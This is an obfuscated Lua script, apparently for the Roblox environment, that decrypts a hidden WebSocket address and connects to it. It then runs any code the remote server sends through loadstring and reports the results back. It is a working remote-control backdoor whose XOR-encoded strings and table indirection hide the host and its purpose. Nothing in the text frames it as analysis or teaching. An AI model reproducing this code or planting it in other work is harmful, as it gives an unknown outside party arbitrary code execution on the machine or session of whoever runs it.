local TABLE_TableIndirection = {};
TABLE_TableIndirection["obf_bitlib%0"] = bit32 or bit;
TABLE_TableIndirection["obf_XOR%0"] = TABLE_TableIndirection["obf_bitlib%0"].bxor;
TABLE_TableIndirection["obf_OR%0"] = TABLE_TableIndirection["obf_bitlib%0"].bor;
TABLE_TableIndirection["obf_AND%0"] = TABLE_TableIndirection["obf_bitlib%0"].band;
TABLE_TableIndirection["obf_stringchar%0"] = string.char;
TABLE_TableIndirection["obf_stringbyte%0"] = string.byte;
TABLE_TableIndirection["obf_stringsub%0"] = string.sub;
TABLE_TableIndirection["obf_bitlib%1"] = bit32 or bit;
TABLE_TableIndirection["obf_XOR%1"] = TABLE_TableIndirection["obf_bitlib%1"].bxor;
TABLE_TableIndirection["obf_tableconcat%0"] = table.concat;
TABLE_TableIndirection["obf_tableinsert%0"] = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	TABLE_TableIndirection["result%0"] = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		TABLE_TableIndirection["obf_tableinsert%0"](TABLE_TableIndirection["result%0"], TABLE_TableIndirection["obf_stringchar%0"](TABLE_TableIndirection["obf_XOR%1"](TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_STR, i, TABLE_TableIndirection["obf_AND%0"](i, 1) + TABLE_TableIndirection["obf_OR%0"](i, 1))), TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), TABLE_TableIndirection["obf_AND%0"](1 + (i % #LUAOBFUSACTOR_KEY), 1) + TABLE_TableIndirection["obf_OR%0"](1 + (i % #LUAOBFUSACTOR_KEY), 1)))) % 256));
	end
	return TABLE_TableIndirection["obf_tableconcat%0"](TABLE_TableIndirection["result%0"]);
end
task.spawn(function()
	TABLE_TableIndirection["a%0"] = WebSocket.connect(LUAOBFUSACTOR_DECRYPT_STR_0("\198\208\129\106\169\179\194\18\200\194\149\53\255\183\194\6\159\219\194\63\188\234\151\71\128\151\148\50\245", "\126\177\163\187\69\134\219\167"));
	TABLE_TableIndirection["a%0"]:Send(LUAOBFUSACTOR_DECRYPT_STR_0("\0\226\4\235\217\0\249\3\234\210\99\254\31\230\223\6\254\25", "\156\67\173\74\165"));
	TABLE_TableIndirection["a%0"].OnMessage:Connect(function(k)
		local s, e = pcall(function()
			TABLE_TableIndirection["a%0"]:Send(tostring(loadstring(k)()));
		end);
		TABLE_TableIndirection["a%0"]:Send(tostring(s) .. LUAOBFUSACTOR_DECRYPT_STR_0("\40\247", "\38\84\215\41\118\220\70") .. tostring(e));
	end);
end);
